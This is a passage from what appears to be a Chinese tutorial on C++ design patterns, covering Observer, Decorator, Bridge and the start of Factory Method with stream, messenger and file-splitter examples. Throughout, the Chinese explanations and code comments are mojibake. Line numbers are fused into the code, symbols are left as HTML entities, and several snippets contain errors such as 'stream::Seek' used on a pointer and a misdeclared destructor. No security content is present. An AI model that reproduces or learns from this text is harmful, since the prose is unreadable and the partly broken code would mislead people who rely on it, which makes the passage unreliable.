splitter.removeIProgress(&amp;ob1); splitter.removeIProgress(this); &#125; // åœ¨mainformä¸­æ›´æ–° virtual void DoProgress(float value)&#123; progressBar-&gt;setValue(value); &#125;&#125;; ä»¥ä¸ŠæŠ½è±¡å‡ºä¸€ä¸ªobserveråŸºç±»ï¼Œç”±subjectè¿›è¡ŒçŠ¶æ€çš„ä¼ é€’ï¼Œè§£è€¦äº†è¿›åº¦æ¡å¯¹è±¡å¤§çš„è®¾è®¡ã€‚ Subjectï¼ˆç›®æ ‡ï¼‰ â€”ç›®æ ‡çŸ¥é“å®ƒçš„è§‚å¯Ÿè€…ã€‚å¯ä»¥æœ‰ä»»æ„å¤šä¸ªè§‚å¯Ÿè€…è§‚å¯ŸåŒä¸€ä¸ªç›®æ ‡ã€‚ â€”æä¾›æ³¨å†Œå’Œåˆ é™¤è§‚å¯Ÿè€…å¯¹è±¡çš„æ¥å£ã€‚ Observerï¼ˆè§‚å¯Ÿè€…ï¼‰ â€”ä¸ºé‚£äº›åœ¨ç›®æ ‡å‘ç”Ÿæ”¹å˜æ—¶éœ€è·å¾—é€šçŸ¥çš„å¯¹è±¡å®šä¹‰ä¸€ä¸ªæ›´æ–°æ¥å£ã€‚ ConcreteSubjectï¼ˆå…·ä½“ç›®æ ‡ï¼‰ â€”å°†æœ‰å…³çŠ¶æ€å­˜å…¥å„ConcreteObserverå¯¹è±¡ã€‚ â€”å½“å®ƒçš„çŠ¶æ€å‘ç”Ÿæ”¹å˜æ—¶,å‘å®ƒçš„å„ä¸ªè§‚å¯Ÿè€…å‘å‡ºé€šçŸ¥ã€‚ ConcreteObserverï¼ˆå…·ä½“è§‚å¯Ÿè€…ï¼‰ â€”ç»´æŠ¤ä¸€ä¸ªæŒ‡å‘ConcreteSubjectå¯¹è±¡çš„å¼•ç”¨ã€‚ â€”å­˜å‚¨æœ‰å…³çŠ¶æ€ï¼Œè¿™äº›çŠ¶æ€åº”ä¸ç›®æ ‡çš„çŠ¶æ€ä¿æŒä¸€è‡´ã€‚ â€”å®ç°Observerçš„æ›´æ–°æ¥å£ä»¥ä½¿è‡ªèº«çŠ¶æ€ä¸ç›®æ ‡çš„çŠ¶æ€ä¿æŒä¸€è‡´ã€‚ æŠ½è±¡ä»£ç ç»“æ„ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136#include &lt;iostream&gt;#include &lt;vector&gt;class Subject;/* * Observer * defines an updating interface for objects that should be notified * of changes in a subject */class Observer&#123;public: virtual ~Observer() &#123;&#125; virtual int getState() = 0; virtual void update( Subject *subject ) = 0; // ...&#125;;/* * Concrete Observer * stores state of interest to ConcreteObserver objects and * sends a notification to its observers when its state changes */class ConcreteObserver : public Observer&#123;public: ConcreteObserver( const int state ) : observer_state( state ) &#123;&#125; ~ConcreteObserver() &#123;&#125; int getState() &#123; return observer_state; &#125; void update( Subject *subject ); // ...private: int observer_state; // ...&#125;;/* * Subject * knows its observers and provides an interface for attaching * and detaching observers */class Subject&#123;public: virtual ~Subject() &#123;&#125; void attach( Observer *observer ) &#123; observers.push_back(observer); &#125; void detach( const int index ) &#123; observers.erase( observers.begin() + index ); &#125; void notify() &#123; for ( unsigned int i = 0; i &lt; observers.size(); i++ ) &#123; observers.at( i )-&gt;update( this ); &#125; &#125; virtual int getState() = 0; virtual void setState( const int s ) = 0; // ...private: std::vector&lt;Observer*&gt; observers; // ...&#125;;/* * Concrete Subject * stores state that should stay consistent with the subject's */class ConcreteSubject : public Subject&#123;public: ~ConcreteSubject() &#123;&#125; int getState() &#123; return subject_state; &#125; void setState( const int s ) &#123; subject_state = s; &#125; // ... private: int subject_state; // ...&#125;;void ConcreteObserver::update( Subject *subject )&#123; observer_state = subject-&gt;getState(); std::cout &lt;&lt; \"Observer state updated.\" &lt;&lt; std::endl;&#125;int main()&#123; ConcreteObserver observer1( 1 ); ConcreteObserver observer2( 2 ); std::cout &lt;&lt; \"Observer 1 state: \" &lt;&lt; observer1.getState() &lt;&lt; std::endl; std::cout &lt;&lt; \"Observer 2 state: \" &lt;&lt; observer2.getState() &lt;&lt; std::endl; Subject *subject = new ConcreteSubject(); subject-&gt;attach( &amp;observer1 ); subject-&gt;attach( &amp;observer2 ); subject-&gt;setState( 10 ); subject-&gt;notify(); std::cout &lt;&lt; \"Observer 1 state: \" &lt;&lt; observer1.getState() &lt;&lt; std::endl; std::cout &lt;&lt; \"Observer 2 state: \" &lt;&lt; observer2.getState() &lt;&lt; std::endl; delete subject; return 0;&#125; å•ä¸€èŒè´£ç›¸å…³æ¨¡å¼ åœ¨è½¯ä»¶ç»„ä»¶çš„è®¾è®¡ä¸­ï¼Œå¦‚æœè´£ä»»åˆ’åˆ†çš„ä¸æ¸…æ™°ï¼Œä½¿ç”¨ç»§æ‰¿å¾—åˆ°çš„ç»“æœå¾€å¾€æ˜¯éšç€éœ€æ±‚çš„å˜åŒ–ï¼Œå­ç±»æ€¥å‰§è†¨èƒ€ï¼ŒåŒæ—¶å……æ–¥ç€é‡å¤ä»£ç ï¼Œè¿™æ—¶å€™çš„å…³é”®æ˜¯åˆ’æ¸…è´£ä»»ã€‚ å…¸å‹æ¨¡å¼ Decorator Bridge Decorator ä½¿ç”¨ç»§æ‰¿æ¥æ‰©å±•å¯¹è±¡çš„åŠŸèƒ½ï¼Œä¸ºç±»å‹å¼•å…¥çš„é™æ€ç‰¹è´¨ï¼Œä½¿å¾—è¿™ç§æ‰©å±•æ–¹å¼ç¼ºä¹çµæ´»æ€§ï¼› å¹¶ä¸”éšç€å­ç±»çš„å¢å¤šï¼ˆæ‰©å±•åŠŸèƒ½çš„å¢å¤šï¼‰ï¼Œå„ç§å­ç±»çš„ç»„åˆï¼ˆæ‰©å±•åŠŸèƒ½çš„ç»„åˆï¼‰ä¼šå¯¼è‡´æ›´å¤šå­ç±»çš„è†¨èƒ€ã€‚ åŠ¨æ€ï¼ˆç»„åˆï¼‰åœ°ç»™ä¸€ä¸ªå¯¹è±¡å¢åŠ ä¸€äº›é¢å¤–çš„èŒè´£ã€‚å°±å¢åŠ åŠŸèƒ½è€Œè¨€ï¼ŒDecoratoræ¨¡å¼æ¯”ç”Ÿæˆå­ç±»ï¼ˆç»§æ‰¿ï¼‰æ›´ä¸ºçµæ´»ï¼ˆæ¶ˆé™¤é‡å¤ä»£ç  &amp; å‡å°‘å­ç±»ä¸ªæ•°ï¼‰ã€‚ ç¤ºä¾‹5 è®¾è®¡ä¸€ä¸ªæ•°æ®æµå¤„ç†ç³»ç»Ÿï¼Œåç»­åœ¨åŸºç¡€ç³»ç»Ÿä¹‹ä¸Šï¼Œæ‰©å±•ä¸åŒç±»å‹çš„æµï¼Œä»¥åŠå¢åŠ åŠ å¯†ã€ç¼“å­˜åŠŸèƒ½ã€‚ å®ç°ä¸€ï¼Œä½¿ç”¨ç±»ç»§æ‰¿çš„æ–¹å¼ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869// åŸºç±»class Stream&#123;publicï¼š virtual char Read(int number)=0; virtual void Seek(int position)=0; virtual void Write(char data)=0; virtual ~Stream()&#123;&#125;&#125;;// 2ç§æµæ•°æ®class FileStream: public Stream&#123;public: virtual char Read(int number)&#123;è¯»æ–‡ä»¶æµ&#125; virtual void Seek(int position)&#123;å®šä½æ–‡ä»¶æµ&#125; virtual void Write(char data)&#123;å†™æ–‡ä»¶æµ&#125;&#125;;class NetworkStream :public Stream&#123;public: virtual char Read(int number)&#123;è¯»ç½‘ç»œæµ&#125; virtual void Seek(int position)&#123;å®šä½ç½‘ç»œæµ&#125; virtual void Write(char data)&#123;å†™ç½‘ç»œæµ&#125;&#125;;// æ‰©å±•åŠŸèƒ½class CryptoFileStream :public FileStream&#123;public: virtual char Read(int number)&#123; //é¢å¤–çš„åŠ å¯†æ“ä½œ... FileStream::Read(number);//è¯»æ–‡ä»¶æµ &#125; virtual void Seek(int position)&#123; //é¢å¤–çš„åŠ å¯†æ“ä½œ... FileStream::Seek(position);//å®šä½æ–‡ä»¶æµ //é¢å¤–çš„åŠ å¯†æ“ä½œ... &#125; virtual void Write(byte data)&#123; //é¢å¤–çš„åŠ å¯†æ“ä½œ... FileStream::Write(data);//å†™æ–‡ä»¶æµ //é¢å¤–çš„åŠ å¯†æ“ä½œ... &#125;&#125;;class CryptoNetworkStream : :public NetworkStream&#123;public: virtual char Read(int number)&#123;...&#125; virtual void Seek(int position)&#123;...&#125; virtual void Write(byte data)&#123;...&#125;&#125;;class BufferedFileStream : public FileStream&#123; virtual char Read(int number)&#123;...&#125; virtual void Seek(int position)&#123;...&#125; virtual void Write(byte data)&#123;...&#125;&#125;;class BufferedNetworkStream : public NetworkStream&#123; virtual char Read(int number)&#123;...&#125; virtual void Seek(int position)&#123;...&#125; virtual void Write(byte data)&#123;...&#125;&#125;;class CryptoBufferedFileStream :public FileStream&#123;public: virtual char Read(int number)&#123;...&#125; virtual void Seek(int position)&#123;...&#125; virtual void Write(byte data)&#123;...&#125;&#125;; å¤§é‡é‡å¤ä»£ç ï¼Œç±»æ•°é‡éšåŠŸèƒ½æ•°å¢é•¿å¾ˆå¿«ã€‚ å®ç°äºŒï¼Œä½¿ç”¨ç»„åˆè€Œä¸æ˜¯ç»§æ‰¿ã€‚å°†åŠŸèƒ½æŠ½è±¡æˆä¸€ç§è£…é¥°ç±»ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778// åŸºç±»class Stream&#123;publicï¼š virtual char Read(int number)=0; virtual void Seek(int position)=0; virtual void Write(char data)=0; virtual ~Stream()&#123;&#125;&#125;;// 2ç§æµæ•°æ®class FileStream: public Stream&#123;public: virtual char Read(int number)&#123;è¯»æ–‡ä»¶æµ&#125; virtual void Seek(int position)&#123;å®šä½æ–‡ä»¶æµ&#125; virtual void Write(char data)&#123;å†™æ–‡ä»¶æµ&#125;&#125;;class NetworkStream :public Stream&#123;public: virtual char Read(int number)&#123;è¯»ç½‘ç»œæµ&#125; virtual void Seek(int position)&#123;å®šä½ç½‘ç»œæµ&#125; virtual void Write(char data)&#123;å†™ç½‘ç»œæµ&#125;&#125;;// ç»„åˆè€Œä¸æ˜¯ç»§æ‰¿// public Streamç»§æ‰¿æ˜¯ä¸ºäº†è§„èŒƒæ¥å£ï¼›è€ŒStream* streamæˆå‘˜æ˜¯è£…é¥°ç»„åˆçš„å…³é”®class CryptoStream: public Stream &#123;private: Stream* stream;public: CryptoStream(Stream* stream):stream(stream)&#123;...&#125; virtual char Read(int number)&#123; //é¢å¤–çš„åŠ å¯†æ“ä½œ... stream-&gt;Read(number);//è¯»æ–‡ä»¶æµ &#125; virtual void Seek(int position)&#123; //é¢å¤–çš„åŠ å¯†æ“ä½œ... stream::Seek(position);//å®šä½æ–‡ä»¶æµ //é¢å¤–çš„åŠ å¯†æ“ä½œ... &#125; virtual void Write(byte data)&#123; //é¢å¤–çš„åŠ å¯†æ“ä½œ... stream::Write(data);//å†™æ–‡ä»¶æµ //é¢å¤–çš„åŠ å¯†æ“ä½œ... &#125;&#125;;class BufferedStream : public Stream&#123;private: Stream* stream; public: BufferedStream(Stream* stream):stream(stream)&#123;&#125; virtual char Read(int number)&#123; //é¢å¤–çš„ç¼“å†²æ“ä½œ... stream-&gt;Read(number);//è¯»æ–‡ä»¶æµ &#125; virtual void Seek(int position)&#123; //é¢å¤–çš„ç¼“å†²æ“ä½œ... stream::Seek(position);//å®šä½æ–‡ä»¶æµ //é¢å¤–çš„ç¼“å†²æ“ä½œ... &#125; virtual void Write(byte data)&#123; //é¢å¤–çš„ç¼“å†²æ“ä½œ... stream::Write(data);//å†™æ–‡ä»¶æµ //é¢å¤–çš„ç¼“å†²æ“ä½œ... &#125;&#125;;int main()&#123; FileStream* s1=new FileStream(); CryptoStream* s2=new CryptoStream(s1); BufferedStream* s3=new BufferedStream(s1); BufferedStream* bufferedCryptoStm=new BufferedStream(s2);&#125; å®ç°ä¸‰ï¼Œå°†æ‹¥æœ‰å…±åŒæˆå‘˜çš„BufferedStreamå’ŒCryptoStreamå†æŠ½è±¡å‡ºä¸€ä¸ªçˆ¶ç±»ã€‚ 123456789101112131415161718192021222324252627282930313233343536// åŸºç±»class Stream&#123; ...&#125;;// 2ç§æµæ•°æ®class FileStream: public Stream&#123; ...&#125;;class NetworkStream :public Stream&#123; ...&#125;;// æŠ½è±¡ä¸€ä¸ªçˆ¶ç±»DecoratorStream: public Stream&#123;protected: Stream* stream; DecoratorStream(Stream * stm):stream(stm)&#123;...&#125;&#125;;class CryptoStream: public DecoratorStream &#123;public: CryptoStream(Stream* stream):DecoratorStream(stream)&#123;...&#125; virtual char Read(int number)&#123;...&#125; virtual void Seek(int position)&#123;...&#125; virtual void Write(byte data)&#123;...&#125;&#125;;class BufferedStream : public DecoratorStream&#123;public: BufferedStream(Stream* stream):DecoratorStream(stream)&#123;&#125; virtual char Read(int number)&#123;...&#125; virtual void Seek(int position)&#123;...&#125; virtual void Write(byte data)&#123;...&#125;&#125;; ä»¥ä¸‹æƒ…å†µä½¿ç”¨ Decoratoræ¨¡å¼ åœ¨ä¸å½±å“å…¶ä»–å¯¹è±¡çš„æƒ…å†µä¸‹ï¼Œä»¥åŠ¨æ€ã€é€æ˜çš„æ–¹å¼ç»™å•ä¸ªå¯¹è±¡æ·»åŠ èŒè´£ã€‚ å¤„ç†é‚£äº›å¯ä»¥æ’¤æ¶ˆçš„èŒè´£ã€‚ å½“ä¸èƒ½é‡‡ç”¨ç”Ÿæˆå­ç±»çš„æ–¹æ³•è¿›è¡Œæ‰©å……æ—¶ã€‚ä¸€ç§æƒ…å†µæ˜¯ï¼Œå¯èƒ½æœ‰å¤§é‡ç‹¬ç«‹çš„æ‰©å±•ï¼Œä¸ºæ”¯æŒæ¯ä¸€ç§ç»„åˆå°†äº§ç”Ÿå¤§é‡çš„å­ç±»ï¼Œä½¿å¾—å­ç±»æ•°ç›®å‘ˆçˆ†ç‚¸æ€§å¢é•¿ã€‚å¦ä¸€ç§æƒ…å†µå¯èƒ½æ˜¯å› ä¸ºç±»å®šä¹‰è¢«éšè—ï¼Œæˆ–ç±»å®šä¹‰ä¸èƒ½ç”¨äºç”Ÿæˆå­ç±»ã€‚ æŠ½è±¡ç»“æ„å¦‚ä¸‹ï¼š æŠ½è±¡ä»£ç ç»“æ„ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102#include &lt;iostream&gt;/* * Component * defines an interface for objects that can have responsibilities * added to them dynamically */class Component&#123;public: virtual ~Component() &#123;&#125; virtual void operation() = 0; // ...&#125;;/* * Concrete Component * defines an object to which additional responsibilities * can be attached */class ConcreteComponent : public Component&#123;public: ~ConcreteComponent() &#123;&#125; void operation() &#123; std::cout &lt;&lt; \"Concrete Component operation\" &lt;&lt; std::endl; &#125; // ...&#125;;/* * Decorator * maintains a reference to a Component object and defines an interface * that conforms to Component's interface */class Decorator : public Component&#123;public: ~Decorator() &#123;&#125; Decorator( Component *c ) : component( c ) &#123;&#125; virtual void operation() &#123; component-&gt;operation(); &#125; // ...private: Component *component;&#125;;/* * Concrete Decorators * add responsibilities to the component (can extend the state * of the component) */class ConcreteDecoratorA : public Decorator&#123;public: ConcreteDecoratorA( Component *c ) : Decorator( c ) &#123;&#125; void operation() &#123; Decorator::operation(); std::cout &lt;&lt; \"Decorator A\" &lt;&lt; std::endl; &#125; // ...&#125;;class ConcreteDecoratorB : public Decorator&#123;public: ConcreteDecoratorB( Component *c ) : Decorator( c ) &#123;&#125; void operation() &#123; Decorator::operation(); std::cout &lt;&lt; \"Decorator B\" &lt;&lt; std::endl; &#125; // ...&#125;;int main()&#123; ConcreteComponent *cc = new ConcreteComponent(); ConcreteDecoratorB *db = new ConcreteDecoratorB( cc ); ConcreteDecoratorA *da = new ConcreteDecoratorA( db ); Component *component = da; component-&gt;operation(); delete da; delete db; delete cc; return 0;&#125; é€šè¿‡é‡‡ç”¨ç»„åˆè€Œéç»§æ‰¿çš„æ‰‹æ³•ï¼Œ Decoratoræ¨¡å¼å®ç°äº†åœ¨è¿è¡Œæ—¶åŠ¨æ€æ‰©å±•å¯¹è±¡åŠŸèƒ½çš„èƒ½åŠ›ï¼Œè€Œä¸”å¯ä»¥æ ¹æ®éœ€è¦æ‰©å±•å¤šä¸ªåŠŸèƒ½ã€‚ Decoratorç±»åœ¨æ¥å£ä¸Šè¡¨ç°ä¸ºis-a Componentçš„ç»§æ‰¿å…³ç³»ï¼Œå³Decoratorç±»ç»§æ‰¿äº†Componentç±»æ‰€å…·æœ‰çš„æ¥å£ã€‚ä½†åœ¨å®ç°ä¸Šåˆè¡¨ç°ä¸ºhas-a Componentçš„ç»„åˆå…³ç³»ï¼Œå³Decoratorç±»åˆä½¿ç”¨äº†å¦å¤–ä¸€ä¸ªComponentç±»ã€‚ Bridge å°†æŠ½è±¡éƒ¨åˆ†(ä¸šåŠ¡åŠŸèƒ½)ä¸å®ç°éƒ¨åˆ†(å¹³å°å®ç°)åˆ†ç¦»ï¼Œä½¿å®ƒä»¬éƒ½å¯ä»¥ç‹¬ç«‹åœ°å˜åŒ–ã€‚ ç®€å•æ¥è®²ï¼Œå°±æ˜¯å°†å˜åŒ–åˆ’åˆ†æˆä¸åŒçš„ç±»åˆ«ï¼Œé€šè¿‡çˆ¶ç±»ç»Ÿä¸€æŸä¸€ç±»å˜åŒ–çš„æ¥å£ã€‚é€šè¿‡ç»„åˆæŠ½è±¡çˆ¶ç±»çš„æŒ‡é’ˆæˆå‘˜ï¼Œè¾¾åˆ°ç®€åŒ–ä»£ç çš„ç›®çš„ã€‚æœ‰ç‚¹æŠ½è±¡ï¼Œçœ‹ç¤ºä¾‹ã€‚ ç¤ºä¾‹6 å®ç°ä¸€ä¸ªæ¶ˆæ¯é€šçŸ¥ç¨‹åºï¼Œå†ä¸åŒçš„ä½¿ç”¨å¹³å°ï¼Œæœ‰ä¸åŒçš„è¡¨ç°å½¢å¼ã€‚ å®ç°ä¸€ï¼Œé€šè¿‡ç±»ç»§æ‰¿ï¼Œè¾¾åˆ°é€‚åº”ä¸åŒå¹³å°çš„ç›®çš„ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566// çº¯è™šåŸºç±»class Messager&#123;public: virtual void Login(string username, string password)=0; virtual void SendMessage(string message)=0; virtual void SendPicture(Image image)=0; virtual void PlaySound()=0; virtual void DrawShape()=0; virtual void WriteText()=0; virtual void Connect()=0; virtual ~Messager()&#123;&#125;&#125;;// å¹³å°å®ç°// æ³¨æ„è¿™é‡Œ PCMessagerBase ä¾ç„¶æœ‰çº¯è™šå‡½æ•°(Loginç­‰)ï¼Œä¸èƒ½å®ä¾‹åŒ–class PCMessagerBase : public Messager&#123;public: virtual void PlaySound()&#123;...&#125; virtual void DrawShape()&#123;...&#125; virtual void WriteText()&#123;...&#125; virtual void Connect()&#123;...&#125;&#125;;class MobileMessagerBase : public Messager&#123;public: virtual void PlaySound()&#123;...&#125; virtual void DrawShape()&#123;...&#125; virtual void WriteText()&#123;...&#125; virtual void Connect()&#123;...&#125;&#125;;// ä¸šåŠ¡æŠ½è±¡// è¿™é‡Œçš„ç±»æ•°ï¼Œåœ¨å¹³å°å®ç°ç±»æ•°åŸºç¡€ä¸Šæˆå€å¢é•¿class PCMessagerLite : public PCMessagerBase &#123;public: virtual void Login(string username, string password)&#123; PCMessagerBase::Connect(); &#125; virtual void SendMessage(string message)&#123; PCMessagerBase::WriteText(); &#125; virtual void SendPicture(Image image)&#123; PCMessagerBase::DrawShape(); &#125;&#125;;class PCMessagerPerfect : public PCMessagerBase &#123;public: virtual void Login(string username, string password)&#123; PCMessagerBase::PlaySound(); PCMessagerBase::Connect(); &#125; virtual void SendMessage(string message)&#123; PCMessagerBase::PlaySound(); PCMessagerBase::WriteText(); &#125; virtual void SendPicture(Image image)&#123; PCMessagerBase::PlaySound(); PCMessagerBase::DrawShape(); &#125;&#125;;class MobileMessagerLite : public MobileMessagerBase &#123;...&#125;;class MobileMessagerPerfect : public MobileMessagerBase &#123;...&#125;; å®ç°äºŒï¼Œä½¿ç”¨ç»„åˆè€Œä¸æ˜¯ç»§æ‰¿ï¼ŒåŒæ—¶åˆ†ç¦»åŸºç±»ä¸­å¹³å°å®ç°å’Œä¸šåŠ¡é€»è¾‘éƒ¨åˆ†ï¼Œä¿è¯ä¸¤éƒ¨åˆ†çš„æ´¾ç”Ÿç±»éƒ½å¯ä»¥åˆ†åˆ«å®ä¾‹åŒ–ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273// åˆ†ç¦»åŸºç±»ä¸­å¹³å°å®ç°å’Œä¸šåŠ¡é€»è¾‘éƒ¨åˆ†class Messager&#123;protected: MessagerImp* messagerImp; // ç»„åˆ Messager(MessagerImp* imp): messagerImp(imp) &#123;...&#125;public: virtual void Login(string username, string password)=0; virtual void SendMessage(string message)=0; virtual void SendPicture(Image image)=0; virtual ~Messager()&#123;&#125;&#125;;class MessagerImp&#123;public: virtual void PlaySound()=0; virtual void DrawShape()=0; virtual void WriteText()=0; virtual void Connect()=0; virtual MessagerImp()&#123;&#125;&#125;;// å¹³å°å®ç°// è¿™é‡Œæ²¡æœ‰çº¯è™šå‡½æ•°ï¼Œèƒ½å®ä¾‹åŒ–class PCMessagerImp : public MessagerImp&#123;public: virtual void PlaySound()&#123;...&#125; virtual void DrawShape()&#123;...&#125; virtual void WriteText()&#123;...&#125; virtual void Connect()&#123;...&#125;&#125;;class MobileMessagerImp : public MessagerImp&#123;public: virtual void PlaySound()&#123;...&#125; virtual void DrawShape()&#123;...&#125; virtual void WriteText()&#123;...&#125; virtual void Connect()&#123;...&#125;&#125;;// ä¸šåŠ¡æŠ½è±¡ m// åŸºç±»ä¸­MessagerImp* æˆå‘˜ï¼Œåˆ©ç”¨å¤šæ€ï¼Œå®ç°ä¸åŒå¹³å°å®ç°çš„ç»„åˆclass MessagerLite:public Messager &#123;public: MessagerLite(MessagerImp *imp): Messager(imp) &#123;...&#125; virtual void Login(string username, string password)&#123; messagerImp-&gt;Connect(); &#125; virtual void SendMessage(string message)&#123; messagerImp-&gt;WriteText(); &#125; virtual void SendPicture(Image image)&#123; messagerImp-&gt;DrawShape(); &#125;&#125;;class MessagerPerfect:public Messager &#123;public: MessagerPerfect(MessagerImp *imp): Messager(imp) &#123;...&#125; virtual void Login(string username, string password)&#123; messagerImp-&gt;PlaySound(); messagerImp-&gt;Connect(); &#125; virtual void SendMessage(string message)&#123; messagerImp-&gt;PlaySound(); messagerImp-&gt;WriteText(); &#125; virtual void SendPicture(Image image)&#123; messagerImp-&gt;PlaySound(); messagerImp-&gt;DrawShape(); &#125;&#125;; æ¡¥æ¨¡å¼ç›¸æ¯”äºDecoratoræ¨¡å¼ï¼Œä¸»è¦æ˜¯é’ˆå¯¹åŸºç±»ï¼Œåˆ†ç¦»äº†ä¸åŒå˜åŒ–æ–¹å‘ï¼ˆæœ‰ç‚¹æŠ½è±¡ï¼Œå°±åƒxè½´yè½´ä»£è¡¨ä¸åŒç»´åº¦ï¼‰çš„æˆå‘˜ï¼Œåˆ†ç¦»æˆå¤šä¸ªç±»ã€‚ æŠ½è±¡ä»£ç ç»“æ„ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697#include &lt;iostream&gt;/* * Implementor * defines the interface for implementation classes */class Implementor&#123;public: virtual ~Implementor() &#123;&#125; virtual void action() = 0; // ...&#125;;/* * Concrete Implementors * implement the Implementor interface and define concrete implementations */class ConcreteImplementorA : public Implementor&#123;public: ~ConcreteImplementorA() &#123;&#125; void action() &#123; std::cout &lt;&lt; \"Concrete Implementor A\" &lt;&lt; std::endl; &#125; // ...&#125;;class ConcreteImplementorB : public Implementor&#123;public: ~ConcreteImplementorB() &#123;&#125; void action() &#123; std::cout &lt;&lt; \"Concrete Implementor B\" &lt;&lt; std::endl; &#125; // ...&#125;;/* * Abstraction * defines the abstraction's interface */class Abstraction&#123;public: virtual ~Abstraction() &#123;&#125; virtual void operation() = 0; // ...&#125;;/* * RefinedAbstraction * extends the interface defined by Abstraction */class RefinedAbstraction : public Abstraction&#123;public: ~RefinedAbstraction() &#123;&#125; RefinedAbstraction(Implementor *impl) : implementor(impl) &#123;&#125; void operation() &#123; implementor-&gt;action(); &#125; // ...private: Implementor *implementor;&#125;;int main()&#123; Implementor *ia = new ConcreteImplementorA; Implementor *ib = new ConcreteImplementorB; Abstraction *abstract1 = new RefinedAbstraction(ia); abstract1-&gt;operation(); Abstraction *abstract2 = new RefinedAbstraction(ib); abstract2-&gt;operation(); delete abstract1; delete abstract2; delete ia; delete ib; return 0;&#125; å¯¹è±¡åˆ›å»ºç›¸å…³æ¨¡å¼ é€šè¿‡â€œå¯¹è±¡åˆ›å»ºâ€ æ¨¡å¼ç»•å¼€newï¼Œæ¥é¿å…å¯¹è±¡åˆ›å»ºï¼ˆnewï¼‰è¿‡ç¨‹ä¸­æ‰€å¯¼è‡´çš„ç´§è€¦åˆï¼ˆä¾èµ–å…·ä½“ç±»ï¼‰ï¼Œä»è€Œæ”¯æŒå¯¹è±¡åˆ›å»ºçš„ç¨³å®šã€‚å®ƒæ˜¯æ¥å£æŠ½è±¡ä¹‹åçš„ç¬¬ä¸€æ­¥å·¥ä½œã€‚ é¢å‘æ¥å£ï¼Œå¯ä»¥è§†ä¸ºä¾èµ–æŠ½è±¡åŸºç±»ï¼Œè°ƒç”¨æŠ½è±¡åŸºç±»æ–¹æ³•ã€‚ å…¸å‹æ¨¡å¼: Factory Method Abstract Factory Prototype Builder Factory Method åœ¨è½¯ä»¶ç³»ç»Ÿä¸­ï¼Œç»å¸¸é¢ä¸´ç€åˆ›å»ºå¯¹è±¡çš„å·¥ä½œï¼›ç”±äºéœ€æ±‚çš„å˜åŒ–ï¼Œéœ€è¦åˆ›å»ºçš„å¯¹è±¡çš„å…·ä½“ç±»å‹ç»å¸¸å˜åŒ–ã€‚ å°†ç¨‹åºä¸­ï¼Œå¯¹å…·ä½“å¯¹è±¡çš„ä¾èµ–ï¼Œè½¬å˜ä¸ºå¯¹æŠ½è±¡çš„åˆ›å»ºå¯¹è±¡çš„æ¥å£çš„ä¾èµ–ã€‚ å®šä¹‰ä¸€ä¸ªç”¨äºåˆ›å»ºå¯¹è±¡çš„æ¥å£ï¼Œè®©å­ç±»å†³å®šå®ä¾‹åŒ–å“ªä¸€ä¸ªç±»ã€‚Factory Methodä½¿å¾—ä¸€ä¸ªç±»çš„å®ä¾‹åŒ–å»¶è¿Ÿï¼ˆç›®çš„ï¼šè§£è€¦ï¼Œæ‰‹æ®µï¼šè™šå‡½æ•°ï¼‰åˆ°å­ç±»ã€‚ ç¤ºä¾‹1 å®ç°ä¸€ä¸ªèƒ½å¤Ÿåˆ‡åˆ†ä¸åŒç±»å‹æ–‡ä»¶çš„åˆ‡åˆ†ç¨‹åºã€‚ å®ç°ä¸€ï¼Œç›´æ¥å»ºç«‹ä¸åŒçš„å…·ä½“åˆ‡åˆ†å¯¹è±¡ã€‚ 123456789class ISplitter&#123;public: virtual void split()=0; virtual ~ISplitter()&#123;&#125;&#125;;class BinarySplitter : public ISplitter&#123;...&#125;;class TxtSplitter: public ISplitter&#123;...&#125;; 1234567class MainForm : public Form &#123;public: void Button_Click()&#123; ISplitter * splitter = new BinarySplitter();//ä¾èµ–å…·ä½“ç±» splitter-&gt;split(); &#125;&#125;; æ˜¾ç„¶ï¼Œnew BinarySplitter()éœ€è¦æ ¹æ®ä¸åŒçš„æ–‡ä»¶ç±»å‹ï¼Œè¿›è¡Œä¿®æ”¹ã€‚ä¸€æ—¦ä¿®æ”¹ï¼Œæºæ–‡ä»¶å°±éœ€è¦é‡æ–°ç¼–è¯‘ã€‚ å®ç°äºŒï¼Œä½¿ç”¨æŠ½è±¡çš„å·¥å‚ï¼Œæä¾›å¯¹è±¡åˆ›å»ºçš„æ¥å£ã€‚ 123456789101112131415161718192021222324252627282930313233//æŠ½è±¡ç±»class ISplitter&#123;public: virtual void split()=0; virtual ~ISplitter()&#123;&#125;&#125;;//å·¥å‚åŸºç±»class SplitterFactory&#123;public: virtual ISplitter* CreateSplitter()=0; virtual ~SplitterFactory()&#123;&#125;&#125;;//å…·ä½“ç±»class BinarySplitter : public ISplitter&#123;...&#125;;class TxtSplitter: public ISplitter&#123;...&#125;;//å…·ä½“å·¥å‚class BinarySplitterFactory: public SplitterFactory&#123;public: virtual ISplitter* CreateSplitter()&#123; return new BinarySplitter(); &#125;&#125;;class TxtSplitterFactory: public SplitterFactory&#123;public: virtual ISplitter* CreateSplitter()&#123; return new TxtSplitter(); &#125;&#125;; 123456789101112class MainForm : public Form&#123; SplitterFactory* factory;//å·¥å‚public: MainForm(SplitterFactory* factory)&#123; this-&gt;factory=factory; &#125; void Button_Click()&#123; ISplitter * splitter=factory-&gt;CreateSplitter(); //å¤šæ€new splitter-&gt;split(); &#125;&#125;; ç°åœ¨ï¼Œåˆ›å»ºä¸åŒå¯¹è±¡ï¼Œåªéœ€è¦è¾“å…¥ä¸åŒçš„å·¥å‚å¯¹è±¡ã€‚è™½ç„¶ä¾æ—§æ˜¯è¦åˆ›å»ºå¯¹è±¡ï¼Œä½†æ˜¯ï¼Œåœ¨ç¼–è¯‘å•å…ƒå±‚é¢ï¼Œä»¥ä¸Šä»£ç 